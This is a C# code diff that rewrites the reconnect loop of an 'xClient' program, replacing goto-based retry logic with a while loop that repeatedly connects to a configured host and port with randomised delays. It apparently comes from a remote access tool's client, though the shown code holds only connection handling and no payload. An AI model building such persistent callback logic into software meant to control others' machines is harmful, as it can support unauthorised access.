@@ -167,35 +167,33 @@ namespace xClient
 
         private static void Connect()
         {
-            TryAgain:
-            Thread.Sleep(250 + new Random().Next(0, 250));
-
-            if (!_connected)
-                ConnectClient.Connect(Settings.HOST, Settings.PORT);
-
-            Thread.Sleep(200);
-
-            Application.DoEvents();
-
-            HoldOpen:
-            while (_connected) // hold client open
+            while (_reconnect && !SystemCore.Disconnect)
             {
-                Application.DoEvents();
-                Thread.Sleep(2500);
+                if (!_connected)
+                {
+                    Thread.Sleep(100 + new Random().Next(0, 250));
+
+                    ConnectClient.Connect(Settings.HOST, Settings.PORT);
+
+                    Thread.Sleep(200);
+
+                    Application.DoEvents();
+                }
+
+                while (_connected) // hold client open
+                {
+                    Application.DoEvents();
+                    Thread.Sleep(2500);
+                }
+
+                if (SystemCore.Disconnect)
+                {
+                    ConnectClient.Disconnect();
+                    return;
+                }
+
+                Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
             }
-
-            Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
-
-            if (SystemCore.Disconnect)
-            {
-                ConnectClient.Disconnect();
-                return;
-            }
-
-            if (_reconnect && !SystemCore.Disconnect && !_connected)
-                goto TryAgain;
-            else
-                goto HoldOpen;
         }
 
         public static void Disconnect(bool reconnect = false)
